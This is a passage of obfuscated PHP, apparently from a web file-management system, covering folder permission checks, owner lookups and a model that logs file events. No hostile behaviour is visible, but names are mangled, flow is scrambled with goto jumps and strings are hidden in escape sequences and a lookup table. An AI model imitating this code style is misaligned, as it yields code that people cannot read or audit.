$F–’†„ÔàÈ = array($cÕÙ‹¯âÔñ[380] => array($cÕÙ‹¯âÔñ[381], $F‘ô®›Û §)); $Bœ÷Á–‡éš = $c¾Œ«â±“¹->field($cÕÙ‹¯âÔñ[2221])->where($F–’†„ÔàÈ)->select(); $Bœ÷Á–‡éš = array_to_keyvalue($Bœ÷Á–‡éš, $cÕÙ‹¯âÔñ[366]); } $a©ŞÎ„«ãİ = $F‘ô®›Û §; foreach ($Bœ÷Á–‡éš as $cİ‰Â·Ûê => $b¶Üèµ”ù) { $Câî‹‰Ó¾ğ = $c¾Œ«â±“¹->parentLevelArray($b¶Üèµ”ù[$cÕÙ‹¯âÔñ[455]]); $a©ŞÎ„«ãİ = array_merge($a©ŞÎ„«ãİ, $Câî‹‰Ó¾ğ, array($cİ‰Â·Ûê)); } goto Eé„Å×®÷; Eé„Å×®÷: $a©ŞÎ„«ãİ = array_values(array_unique($a©ŞÎ„«ãİ)); if (!$a©ŞÎ„«ãİ) { return array(); } $D´¡ĞçãÅ² = $cÕÙ‹¯âÔñ[2222]; goto c´ä…ã´²Â; fÉ˜¥¿·ÎŠ: $cÕÙ‹¯âÔñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$F‘ô®›Û §) { return array(); } $c¾Œ«â±“¹ = Model($cÕÙ‹¯âÔñ[1102]); goto b¤†·—ã„‘; C¬áÇ¡£Ô: $A„³àÆóÁ = array(); foreach ($Bœ÷Á–‡éš as $fƒ¿êğºÊÏ => $a¥¨Í¢‚Óà) { $A„³àÆóÁ[$fƒ¿êğºÊÏ] = $this->makeSourceAuth($a¥¨Í¢‚Óà, $BÒ±èªÇ²Ù); } return $A„³àÆóÁ; goto dî÷¸Á¢; c´ä…ã´²Â: $F–’†„ÔàÈ = array($cÕÙ‹¯âÔñ[380] => array($cÕÙ‹¯âÔñ[381], $a©ŞÎ„«ãİ)); $BÒ±èªÇ²Ù = $this->field($D´¡ĞçãÅ²)->where($F–’†„ÔàÈ)->select(); $BÒ±èªÇ²Ù = array_to_keyvalue_group($BÒ±èªÇ²Ù, $cÕÙ‹¯âÔñ[366]); goto C¬áÇ¡£Ô; dî÷¸Á¢: } public function authDeepCheck($A™£«À…‹ô, $eá­¦ĞŞÔÕ = false) { $cø—äç’½» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (_get($GLOBALS, $cø—äç’½»[453])) { return !1; } $bßÛÁô´¾Ä = $this->makeAuthDeep(); if (!in_array($A™£«À…‹ô, $bßÛÁô´¾Ä)) { return !1; } return array($cø—äç’½»[374] => -1, $cø—äç’½»[414] => array($cø—äç’½»[382] => $cø—äç’½»[1023], $cø—äç’½»[2078] => $cø—äç’½»[464], $cø—äç’½»[383] => LNG($cø—äç’½»[2223]), $cø—äç’½»[2090] => $cø—äç’½»[2224])); } protected function makeAuthDeep() { goto BÖ»êµîİ; BÖ»êµîİ: $e¨ÄßÃ®¾‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $d´ÉÕ‚Íùº = false; if ($d´ÉÕ‚Íùº) { return $d´ÉÕ‚Íùº; } goto cÈïÑÏßÙ; fÂêî£×‹ß: $bæø‚¢Ê“š = array_values(array_unique($bæø‚¢Ê“š)); foreach ($bæø‚¢Ê“š as $FÉ ìßÑÇ•) { $dßáëÏô„  = $A«É‰«Àš’->getInfo($FÉ ìßÑÇ•); $d´ÉÕ‚Íùº[] = $dßáëÏô„ [$e¨ÄßÃ®¾‘[388]][$e¨ÄßÃ®¾‘[366]]; } $d´ÉÕ‚Íùº = array_values(array_unique($d´ÉÕ‚Íùº)); goto fÕ¾ïœ‚; A˜£–î¸‘¿: $d’ŠÅÏ¢ã = Model($e¨ÄßÃ®¾‘[1102]); $A«É‰«Àš’ = Model($e¨ÄßÃ®¾‘[454]); if ($BÂ°¶Ê¾†›) { $AŞ†ò»Åô“ = $d’ŠÅÏ¢ã->where(array($e¨ÄßÃ®¾‘[366] => array($e¨ÄßÃ®¾‘[381], $BÂ°¶Ê¾†›)))->select(); foreach ($AŞ†ò»Åô“ as $dÙ¬‹ÏÕÍÛ) { $aøñ‰»»º‹ = $d’ŠÅÏ¢ã->parentLevelArray($dÙ¬‹ÏÕÍÛ[$e¨ÄßÃ®¾‘[455]]); $d´ÉÕ‚Íùº = array_merge($d´ÉÕ‚Íùº, $aøñ‰»»º‹); $bæø‚¢Ê“š[] = $dÙ¬‹ÏÕÍÛ[$e¨ÄßÃ®¾‘[452]]; } } goto DóÃ¸¥Š•; c ğ˜Æßï: $a´›µ¢„‘’ = Session::get($e¨ÄßÃ®¾‘[2184]); $a´›µ¢„‘’ = array_to_keyvalue($a´›µ¢„‘’, $e¨ÄßÃ®¾‘[33], $e¨ÄßÃ®¾‘[2072]); $F ³•Ì°Ñ¯ = array($e¨ÄßÃ®¾‘[368] => SourceModel::TYPE_USER, $e¨ÄßÃ®¾‘[452] => USER_ID); goto F­ƒË‘´º; bó¥ì„¦±†: $BÂ°¶Ê¾†› = array_to_keyvalue($c§Ä›²î¿›, $e¨ÄßÃ®¾‘[33], $e¨ÄßÃ®¾‘[366]); $d´ÉÕ‚Íùº = array(); $bæø‚¢Ê“š = $a´›µ¢„‘’; goto A˜£–î¸‘¿; DóÃ¸¥Š•: $bæø‚¢Ê“š = array_values(array_unique($bæø‚¢Ê“š)); $Aœë¹®ù—á = $bæø‚¢Ê“š; foreach ($Aœë¹®ù—á as $FÉ ìßÑÇ•) { $dßáëÏô„  = $A«É‰«Àš’->getInfo($FÉ ìßÑÇ•); $aøñ‰»»º‹ = $d’ŠÅÏ¢ã->parentLevelArray($dßáëÏô„ [$e¨ÄßÃ®¾‘[455]]); $bæø‚¢Ê“š = array_merge($bæø‚¢Ê“š, $aøñ‰»»º‹); } goto fÂêî£×‹ß; fÕ¾ïœ‚: return $d´ÉÕ‚Íùº; goto E…ƒ™­õİ; cÈïÑÏßÙ: $cáµêÖ£ = Model($e¨ÄßÃ®¾‘[2225])->listData(); $CàÉ†İŠ…â = array(); foreach ($cáµêÖ£ as $eŠ¾³††İÈ) { if ($eŠ¾³††İÈ[$e¨ÄßÃ®¾‘[373]] == 0 && $eŠ¾³††İÈ[$e¨ÄßÃ®¾‘[2092]] == $e¨ÄßÃ®¾‘[83]) { $CàÉ†İŠ…â[] = $eŠ¾³††İÈ[$e¨ÄßÃ®¾‘[364]]; } } goto c ğ˜Æßï; F­ƒË‘´º: if ($a´›µ¢„‘’) { $F ³•Ì°Ñ¯ = array(array($e¨ÄßÃ®¾‘[368] => SourceModel::TYPE_USER, $e¨ÄßÃ®¾‘[452] => USER_ID), array($e¨ÄßÃ®¾‘[368] => SourceModel::TYPE_GROUP, $e¨ÄßÃ®¾‘[452] => array($e¨ÄßÃ®¾‘[381], $a´›µ¢„‘’)), $e¨ÄßÃ®¾‘[908] => $e¨ÄßÃ®¾‘[2152]); } if ($CàÉ†İŠ…â) { $F ³•Ì°Ñ¯ = array($F ³•Ì°Ñ¯, $e¨ÄßÃ®¾‘[2200] => array($e¨ÄßÃ®¾‘[2226], $CàÉ†İŠ…â)); } $c§Ä›²î¿› = $this->field($e¨ÄßÃ®¾‘[2227])->where($F ³•Ì°Ñ¯)->select(); goto bó¥ì„¦±†; E…ƒ™­õİ: } private function makeSourceAuth($EÕóÂ´‘™œ, $EñÉİù—‘µ) { goto aùÖ‡Áä¿; aùÖ‡Áä¿: $aÁëóŠŠÍó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eˆ¸¹ï‰¶ = Session::get($aÁëóŠŠÍó[2184]); $cáÓ×÷ÈË = Model($aÁëóŠŠÍó[1102])->parentLevelArray($EÕóÂ´‘™œ[$aÁëóŠŠÍó[455]]); goto F øÙÙ¸¸; F øÙÙ¸¸: $cáÓ×÷ÈË = array_merge(array($EÕóÂ´‘™œ[$aÁëóŠŠÍó[366]]), array_reverse($cáÓ×÷ÈË)); $b÷¥Û¡É¬… = !1; foreach ($cáÓ×÷ÈË as $a¤”¢œø¶­) { if (!isset($EñÉİù—‘µ[$a¤”¢œø¶­])) { continue; } $eíÇŒì…š  = $this->authMake($EñÉİù—‘µ[$a¤”¢œø¶­]); if ($eíÇŒì…š [$aÁëóŠŠÍó[414]]) { $b÷¥Û¡É¬… = $eíÇŒì…š ; break; } } goto EÒÉõØåîŒ; EÒÉõØåîŒ: if (!$b÷¥Û¡É¬…) { $Eˆ¸¹ï‰¶ = array_to_keyvalue($Eˆ¸¹ï‰¶, $aÁëóŠŠÍó[2072]); $FÛª›¡°ë = $EÕóÂ´‘™œ[$aÁëóŠŠÍó[452]]; $FæàÇÇÔ‹Ñ = isset($Eˆ¸¹ï‰¶[$FÛª›¡°ë]) ? $Eˆ¸¹ï‰¶[$FÛª›¡°ë] : !1; if ($FæàÇÇÔ‹Ñ) { $b÷¥Û¡É¬… = array($aÁëóŠŠÍó[2228] => intval($FæàÇÇÔ‹Ñ[$aÁëóŠŠÍó[373]][$aÁëóŠŠÍó[373]]), $aÁëóŠŠÍó[2229] => $FæàÇÇÔ‹Ñ[$aÁëóŠŠÍó[373]]); } } if ((!$b÷¥Û¡É¬… || $b÷¥Û¡É¬…[$aÁëóŠŠÍó[374]] <= 0) && $EÕóÂ´‘™œ[$aÁëóŠŠÍó[368]] == SourceModel::TYPE_GROUP) { $EÖå™êçÄ¿ = $this->authDeepCheck($EÕóÂ´‘™œ[$aÁëóŠŠÍó[366]], $b÷¥Û¡É¬…); if ($EÖå™êçÄ¿) { $b÷¥Û¡É¬… = $EÖå™êçÄ¿; } } return $b÷¥Û¡É¬…; goto f®Ï’±ôÎŸ; f®Ï’±ôÎŸ: } public function authOwnerApply($CíŞ­‡³Ÿ) { goto bñœ´îàõ; bÅåµ“‹ƒ: if (count($FŒñÁŒ¦ò) == 0) { $FŒñÁŒ¦ò = $this->authFolderOwnerGroup($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[452]]); } $FŒñÁŒ¦ò = array_unique($FŒñÁŒ¦ò); if (AuthModel::authCheckRoot($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[373]][$bÔ“‚‰ˆÀ[374]])) { $FŒñÁŒ¦ò[] = USER_ID; } goto fšŒñï×ÍÌ; A´Ú÷–¼Ø¹: $f±›È»´ = Model($bÔ“‚‰ˆÀ[1102])->parentLevelArray($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[455]]); $f±›È»´ = array_merge(array($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[366]]), array_reverse($f±›È»´)); $F¨âêºåŠ = $bÔ“‚‰ˆÀ[2222]; goto Fƒæ¾éÁÉ; bë‰¢­Â: $BÕ‰×Ã¤í = array(); $FŒñÁŒ¦ò = array(); foreach ($DÈš‚öå«å as $FíÛ«ßöê° => $fñõˆ…°«ï) { $A¤‚•öÂù£ = $this->authFolderOwnerUser($fñõˆ…°«ï); $BÕ‰×Ã¤í[$FíÛ«ßöê°] = $A¤‚•öÂù£; $FŒñÁŒ¦ò = array_merge($FŒñÁŒ¦ò, $A¤‚•öÂù£[$bÔ“‚‰ˆÀ[531]]); if ($A¤‚•öÂù£[$bÔ“‚‰ˆÀ[2231]]) { break; } } goto bÅåµ“‹ƒ; Fƒæ¾éÁÉ: $A¯Ÿë¾å‡ = array($bÔ“‚‰ˆÀ[380] => array($bÔ“‚‰ˆÀ[381], $f±›È»´)); $DÈš‚öå«å = $this->field($F¨âêºåŠ)->where($A¯Ÿë¾å‡)->select(); $DÈš‚öå«å = array_to_keyvalue_group($DÈš‚öå«å, $bÔ“‚‰ˆÀ[366]); goto bë‰¢­Â; bñœ´îàõ: $bÔ“‚‰ˆÀ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[373]]) || isset($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[2230]]) && $CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[2230]]) { return $CíŞ­‡³Ÿ; } if (AuthModel::authCheckRoot($CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[373]][$bÔ“‚‰ˆÀ[374]])) { return $CíŞ­‡³Ÿ; } goto A´Ú÷–¼Ø¹; fšŒñï×ÍÌ: $CíŞ­‡³Ÿ[$bÔ“‚‰ˆÀ[373]][$bÔ“‚‰ˆÀ[2232]] = Model($bÔ“‚‰ˆÀ[470])->userListInfo($FŒñÁŒ¦ò); return $CíŞ­‡³Ÿ; goto c³í¸Ú‚Êğ; c³í¸Ú‚Êğ: } private function authFolderOwnerGroup($A˜ğ‰—ùä) { $E˜ŠÙé‰— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B•¾¿Æå… = Model($E˜ŠÙé‰—[2146])->where(array($E˜ŠÙé‰—[2072] => $A˜ğ‰—ùä))->select(); $FŒ·¸¤Äˆ = array(); if (!$B•¾¿Æå…) { return $FŒ·¸¤Äˆ; } foreach ($B•¾¿Æå… as $AÚ©’æõ’) { $d‚ŠÙæéß” = $this->authInfo($AÚ©’æõ’); if (AuthModel::authCheckRoot($d‚ŠÙæéß”[$E˜ŠÙé‰—[373]])) { $FŒ·¸¤Äˆ[] = $AÚ©’æõ’[$E˜ŠÙé‰—[1409]]; } } return $FŒ·¸¤Äˆ; } private function authFolderOwnerUser($cäåÀºñ÷) { $cøÌĞªºÒÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B÷à§¼ö = array(); $bƒ¿ßïÍë˜ = !1; foreach ($cäåÀºñ÷ as $cç…È’¥ô¬) { $B÷­›Ã¹Œ = $this->authInfo($cç…È’¥ô¬); if ($cç…È’¥ô¬[$cøÌĞªºÒÊ[452]] == $cøÌĞªºÒÊ[464]) { $bƒ¿ßïÍë˜ = !0; } if ($cç…È’¥ô¬[$cøÌĞªºÒÊ[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($B÷­›Ã¹Œ[$cøÌĞªºÒÊ[373]])) { $B÷à§¼ö[] = $cç…È’¥ô¬[$cøÌĞªºÒÊ[452]]; } } } return array($cøÌĞªºÒÊ[531] => $B÷à§¼ö, $cøÌĞªºÒÊ[2231] => $bƒ¿ßïÍë˜); } public function authMake($fñ¾İóíëà) { goto CªÒçÒ•¸©; FÛÅ¶“Ş¿: $BæŒ¸°™ï± = $Fè¯ç²¤‰® ? $e–…†…•†¼ : ($EÏôô´æÄ´ ? $A‘‘ìÚ¤ÓÈ : $aÕµËªâíÅ); $BÓÙ¢°Ù¨ = array($eëÉ‚õÀ®Ú[2228] => intval($F«§‚ˆŞñ), $eëÉ‚õÀ®Ú[2229] => $BæŒ¸°™ï±); return $BÓÙ¢°Ù¨; goto F³‘Úƒ„Ñ‡; c¸ÓáèÒÍ: $b‰Ç šäÆ¹ = 0; $e–…†…•†¼ = 0; $A‘‘ìÚ¤ÓÈ = 0; goto C¤ƒÎøÁˆ÷; F¹Ã¢±´â–: $f©²¿¹Öªå = array_to_keyvalue($B»½‘ä˜ñá, $eëÉ‚õÀ®Ú[33], $eëÉ‚õÀ®Ú[2072]); $CÍ¶îÔ’Ü = 0; $e —‘÷ˆ‚ò = 0; goto c¸ÓáèÒÍ; CªÒçÒ•¸©: $eëÉ‚õÀ®Ú =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$fñ¾İóíëà) { return array($eëÉ‚õÀ®Ú[374] => 0, $eëÉ‚õÀ®Ú[414] => !1); } $B»½‘ä˜ñá = Session::get($eëÉ‚õÀ®Ú[2184]); goto F¹Ã¢±´â–; b˜™½ƒ²Ìˆ: $C¦›·Çèî‘ = 0; foreach ($fñ¾İóíëà as $b–ÑœØ») { $BæŒ¸°™ï± = $this->authInfo($b–ÑœØ»); $c™ä¶ÙÍ§ = $b–ÑœØ»[$eëÉ‚õÀ®Ú[452]]; $d±ª—‰Îñˆ = intval($BæŒ¸°™ï±[$eëÉ‚õÀ®Ú[373]]); if ($b–ÑœØ»[$eëÉ‚õÀ®Ú[368]] == SourceModel::TYPE_USER && $c™ä¶ÙÍ§ == USER_ID) { $Fè¯ç²¤‰® = !0; $e–…†…•†¼ = $BæŒ¸°™ï±; $CÍ¶îÔ’Ü = $d±ª—‰Îñˆ; } else { if ($b–ÑœØ»[$eëÉ‚õÀ®Ú[368]] == SourceModel::TYPE_GROUP && in_array($c™ä¶ÙÍ§, $f©²¿¹Öªå)) { $EÏôô´æÄ´ = !0; if ($d±ª—‰Îñˆ >= $e —‘÷ˆ‚ò) { $e —‘÷ˆ‚ò = $d±ª—‰Îñˆ; $A‘‘ìÚ¤ÓÈ = $BæŒ¸°™ï±; } } else { if ($c™ä¶ÙÍ§ == $eëÉ‚õÀ®Ú[464]) { $C¦›·Çèî‘ = !0; $aÕµËªâíÅ = $BæŒ¸°™ï±; $b‰Ç šäÆ¹ = $d±ª—‰Îñˆ; } } } } $F«§‚ˆŞñ = $Fè¯ç²¤‰® ? $CÍ¶îÔ’Ü : ($EÏôô´æÄ´ ? $e —‘÷ˆ‚ò : $b‰Ç šäÆ¹); goto FÛÅ¶“Ş¿; C¤ƒÎøÁˆ÷: $aÕµËªâíÅ = 0; $Fè¯ç²¤‰® = 0; $EÏôô´æÄ´ = 0; goto b˜™½ƒ²Ìˆ; F³‘Úƒ„Ñ‡: } public function authTargetInfoMake($e›Ó¨ÓÄÈ£) { goto b“‘Êğ¥µ¸; b“‘Êğ¥µ¸: $bä¬İŠŸ© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F—öĞôŸ©› = array(); $bØ„Ş‹—Ã‹ = array(); goto C©Ãó²íËÃ; dËÏ¡–¨ğ¾: return array($bä¬İŠŸ©[2233] => $F—öĞôŸ©›, $bä¬İŠŸ©[2234] => $bØ„Ş‹—Ã‹); goto aÆ“¦êàà³; C©Ãó²íËÃ: foreach ($e›Ó¨ÓÄÈ£ as $fœ–„ÛõØª) { if ($fœ–„ÛõØª[$bä¬İŠŸ©[368]] == SourceModel::TYPE_USER) { $F—öĞôŸ©›[] = intval($fœ–„ÛõØª[$bä¬İŠŸ©[452]]); } else { if ($fœ–„ÛõØª[$bä¬İŠŸ©[368]] == SourceModel::TYPE_GROUP) { $bØ„Ş‹—Ã‹[] = intval($fœ–„ÛõØª[$bä¬İŠŸ©[452]]); } } } if ($F—öĞôŸ©›) { $F—öĞôŸ©› = Model($bä¬İŠŸ©[470])->userListInfo($F—öĞôŸ©›); } if ($bØ„Ş‹—Ã‹) { $AµÆ¨…Ÿ×À = array($bä¬İŠŸ©[2144] => array($bä¬İŠŸ©[381], $bØ„Ş‹—Ã‹)); $bØ„Ş‹—Ã‹ = Model($bä¬İŠŸ©[454])->field($bä¬İŠŸ©[2157])->where($AµÆ¨…Ÿ×À)->select(); $bØ„Ş‹—Ã‹ = array_to_keyvalue($bØ„Ş‹—Ã‹, $bä¬İŠŸ©[2072]); } goto dËÏ¡–¨ğ¾; aÆ“¦êàà³: } private function authInfo($fïñ¨Å¢Ç›) { $FŸÇğõää‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($fïñ¨Å¢Ç›[$FŸÇğõää‹[2200]]) { $c…ïëæª… = Model($FŸÇğõää‹[2219])->listData($fïñ¨Å¢Ç›[$FŸÇğõää‹[2200]]); if (!$c…ïëæª…) { return !1; $c¢Ãê÷‡Ÿ” = Model($FŸÇğõää‹[2219])->listData(); $a’ÆíŒ„Çõ = array_filter_by_field($c¢Ãê÷‡Ÿ”, $FŸÇğõää‹[373], $FŸÇğõää‹[464]); return $a’ÆíŒ„Çõ; } $a»ºÎÌô¾Š = array_field_key($c…ïëæª…, array($FŸÇğõää‹[364], $FŸÇğõää‹[28], $FŸÇğõää‹[373], $FŸÇğõää‹[2090], $FŸÇğõää‹[2093])); $a»ºÎÌô¾Š[$FŸÇğõää‹[2235]] = $fïñ¨Å¢Ç›; return $a»ºÎÌô¾Š; } else { return array($FŸÇğõää‹[382] => 0, $FŸÇğõää‹[2078] => $fïñ¨Å¢Ç›[$FŸÇğõää‹[2201]], $FŸÇğõää‹[383] => $FŸÇğõää‹[33], $FŸÇğõää‹[2090] => $FŸÇğõää‹[2236]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\143\145\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\124\151\x6d\145", "\x74\x69\x6d\145", "\x69\156\163\x65\162\164", "\146\165\156\143\x74\151\x6f\x6e"), array("\144\x65\x73\143", '', "\151\156\163\145\x72\164\x2c\x75\160\x64\x61\x74\x65\x2c\x73\x65\x6c\x65\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($cÏÈ‡ô‹Ğ, $F÷ÛÑÌ‡Šµ, $A‡Ø¦¹¶‡ = '') { goto cŞùîùïîç; eÙ×Ï§÷‰¾: if (!$Bì¹”­¶¼) { return !1; } if ($this->isCacheEvent($Bì¹”­¶¼, $F÷ÛÑÌ‡Šµ)) { return; } if ($A‡Ø¦¹¶‡ && is_string($A‡Ø¦¹¶‡)) { $A‡Ø¦¹¶‡ = array($fÚ¼ß¾¨[2102] => $A‡Ø¦¹¶‡); } goto bî÷óªˆ„ù; cŞùîùïîç: $fÚ¼ß¾¨ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->eventSave) { return; } $Bì¹”­¶¼ = Model($fÚ¼ß¾¨[1102])->sourceInfo($cÏÈ‡ô‹Ğ); goto eÙ×Ï§÷‰¾; bî÷óªˆ„ù: $Fáéç˜ã´ê = array($fÚ¼ß¾¨[380] => $cÏÈ‡ô‹Ğ, $fÚ¼ß¾¨[2237] => $Bì¹”­¶¼[$fÚ¼ß¾¨[457]], $fÚ¼ß¾¨[2238] => $Bì¹”­¶¼[$fÚ¼ß¾¨[28]], $fÚ¼ß¾¨[462] => $Bì¹”­¶¼[$fÚ¼ß¾¨[462]], $fÚ¼ß¾¨[1400] => USER_ID, $fÚ¼ß¾¨[385] => $F÷ÛÑÌ‡Šµ, $fÚ¼ß¾¨[1402] => $A‡Ø¦¹¶‡); $this->addSystemLog($F÷ÛÑÌ‡Šµ, $Fáéç˜ã´ê); return $this->add($Fáéç˜ã´ê); goto A´ÃŞŒƒË‹; A´ÃŞŒƒË‹: } private function addSystemLog($d†½ùĞÄ’å, $BùßŒÇŞÔŸ) { $eœéÇ‹¤­¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($d†½ùĞÄ’å == $eœéÇ‹¤­¸[2239]) { $d†½ùĞÄ’å = $BùßŒÇŞÔŸ[$eœéÇ‹¤­¸[401]][$eœéÇ‹¤­¸[2240]]; } else { if (in_array($d†½ùĞÄ’å, array($eœéÇ‹¤­¸[2049], $eœéÇ‹¤­¸[2241]))) { $d†½ùĞÄ’å = $BùßŒÇŞÔŸ[$eœéÇ‹¤­¸[401]][$eœéÇ‹¤­¸[687]]; } } $d³¡¶ã™‚  = array_merge($BùßŒÇŞÔŸ, array($eœéÇ‹¤­¸[2242] => $BùßŒÇŞÔŸ[$eœéÇ‹¤­¸[366]], $eœéÇ‹¤­¸[2243] => $BùßŒÇŞÔŸ[$eœéÇ‹¤­¸[2243]])); Model($eœéÇ‹¤­¸[2013])->addLog($eœéÇ‹¤­¸[2244] . $d†½ùĞÄ’å, $d³¡¶ã™‚ ); } private function isCacheEvent($DèŠÀ®Ñİ, $AŠäöó ƒ) { if ($DèŠÀ®Ñİ[$_SERVER[ÚŠ•´ÍéÒÑÔ][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($eÎÇ†èÖÍ, $fËº¬Ñòîà) { $d±Ä–¡ß…­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e‡’ÌÉ™ = Model($d±Ä–¡ß…­[1102])->sourceInfo($eÎÇ†èÖÍ); $Aªª„»¸Ïˆ = array($d±Ä–¡ß…­[2240] => $fËº¬Ñòîà, $d±Ä–¡ß…­[28] => $e‡’ÌÉ™[$d±Ä–¡ß…­[28]]); return $this->addEvent($eÎÇ†èÖÍ, $d±Ä–¡ß…­[2239], $Aªª„»¸Ïˆ); } public function eventFileEdit($aÃÛáƒ¯’Û) { $c¥²å…Á =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b ±ƒä‡†² = array($c¥²å…Á[2245] => $_SERVER[$c¥²å…Á[2246]], $c¥²å…Á[1719] => strtolower(ACTION)); return $this->addEvent($aÃÛáƒ¯’Û, $c¥²å…Á[2040], $b ±ƒä‡†²); } public function eventRecycle($A›…Ş‰ò‚Ö, $B÷¶¢ÒğÛ) { return $this->addEvent($A›…Ş‰ò‚Ö, $_SERVER[ÚŠ•´ÍéÒÑÔ][2241], $B÷¶¢ÒğÛ); } public function eventRemove($a±»½±æ»ñ) { $d¦Ú™…òùÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e±ï‚™‘÷Ä = Model($d¦Ú™…òùÚ[1102])->sourceInfo($a±»½±æ»ñ); $EšôÈò‡ˆ = $e±ï‚™‘÷Ä[$d¦Ú™…òùÚ[28]]; return $this->addEvent($e±ï‚™‘÷Ä[$d¦Ú™…òùÚ[457]], $d¦Ú™…òùÚ[2039], $EšôÈò‡ˆ); } public function eventShare($f»†Şõ‡²‰, $bèºßöÔ×š) { return $this->addEvent($f»†Şõ‡²‰, $_SERVER[ÚŠ•´ÍéÒÑÔ][2049], $bèºßöÔ×š); } public function eventMove($EÙ«è”äµ, $cÍâéÓ³ÖÑ, $a‡ƒ„‡ê¼â) { goto aÛÄºÖÎÈ; f¨Œ–ÚğÀ™: $this->addEvent($EÙ«è”äµ, $B©˜¤…İÉ°[488], $d‡ßÆÕèµ¾); $a…™”„†† = $dİŠ’²áç‹->sourceInfo($EÙ«è”äµ); $d‡ßÆÕèµ¾ = array($B©˜¤…İÉ°[366] => $a…™”„††[$B©˜¤…İÉ°[366]], $B©˜¤…İÉ°[28] => $a…™”„††[$B©˜¤…İÉ°[28]]); goto eÁŠÏŠ„‘ß; eÁŠÏŠ„‘ß: $this->addEvent($cÍâéÓ³ÖÑ, $B©˜¤…İÉ°[2251], $d‡ßÆÕèµ¾); goto bÕ»ë³¼Ûš; d¨ê’¼ˆ‚: $AƒÒÁ”­ = $dİŠ’²áç‹->sourceInfo($cÍâéÓ³ÖÑ); $b»öš–ã±á = $dİŠ’²áç‹->sourceInfo($a‡ƒ„‡ê¼â); $d‡ßÆÕèµ¾ = array($B©˜¤…İÉ°[998] => $cÍâéÓ³ÖÑ, $B©˜¤…İÉ°[2247] => $AƒÒÁ”­[$B©˜¤…İÉ°[28]], $B©˜¤…İÉ°[2248] => $AƒÒÁ”­[$B©˜¤…İÉ°[462]], $B©˜¤…İÉ°[999] => $a‡ƒ„‡ê¼â, $B©˜¤…İÉ°[2249] => $b»öš–ã±á[$B©˜¤…İÉ°[28]], $B©˜¤…İÉ°[2250] => $b»öš–ã±á[$B©˜¤…İÉ°[462]]); goto f¨Œ–ÚğÀ™; aÛÄºÖÎÈ: $B©˜¤…İÉ° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dİŠ’²áç‹ = Model($B©˜¤…İÉ°[1102]); $a…™”„†† = $dİŠ’²áç‹->sourceInfo($EÙ«è”äµ); goto d¨ê’¼ˆ‚; bÕ»ë³¼Ûš: } public function eventCopy($BÜëñ£ò®Ş) { $this->eventCreate($BÜëñ£ò®Ş, $_SERVER[ÚŠ•´ÍéÒÑÔ][486]); } public function eventRename($d¨‘¿¹®ê, $Cº¨Í¶“†ä, $b«ÏÉ”ò‹) { $dà¤†îãâŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eîì±ê¥ù” = array($dà¤†îãâŒ[998] => $Cº¨Í¶“†ä, $dà¤†îãâŒ[999] => $b«ÏÉ”ò‹); return $this->addEvent($d¨‘¿¹®ê, $dà¤†îãâŒ[1114], $eîì±ê¥ù”); } public function eventAddComment($eáìŒ–İÄ, $D¬Üİõ©Øç) { return $this->addEvent($eáìŒ–İÄ, $_SERVER[ÚŠ•´ÍéÒÑÔ][2252], $D¬Üİõ©Øç); } public function eventAddDesc($c²Æ¥ß¼à, $FÙ¢å¤§ÜÁ) { return $this->addEvent($c²Æ¥ß¼à, $_SERVER[ÚŠ•´ÍéÒÑÔ][2253], $FÙ¢å¤§ÜÁ); } public function listBySource($f¡Ğ™õï†Ò) { goto D±ĞÔ£ôÒ¾; D±ĞÔ£ôÒ¾: $CÜÔİâ¹îì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a´ÁÖï¢Šù = Model($CÜÔİâ¹îì[1102])->sourceInfo($f¡Ğ™õï†Ò); $dØÄ•ÅŞ‡¾ = array($CÜÔİâ¹îì[380] => $f¡Ğ™õï†Ò); goto A–ŠÒ”§»Õ; A–ŠÒ”§»Õ: if ($a´ÁÖï¢Šù[$CÜÔİâ¹îì[367]] == $CÜÔİâ¹îì[83]) { $dê¢íçß¬ = Model($CÜÔİâ¹îì[1102])->listSearchChildren($f¡Ğ™õï†Ò, 20000); $dê¢íçß¬[] = $f¡Ğ™õï†Ò . $CÜÔİâ¹îì[358]; $dØÄ•ÅŞ‡¾ = array($CÜÔİâ¹îì[366] => array($CÜÔİâ¹îì[7], $dê¢íçß¬)); } $fÌÏ–ğÜ‹Ï = $this->where($dØÄ•ÅŞ‡¾)->order($CÜÔİâ¹îì[2254])->selectPage(); if ($fÌÏ–ğÜ‹Ï[$CÜÔİâ¹îì[348]][$CÜÔİâ¹îì[349]] == 0) { $fÌÏ–ğÜ‹Ï[$CÜÔİâ¹îì[348]][$CÜÔİâ¹îì[349]] = 1; 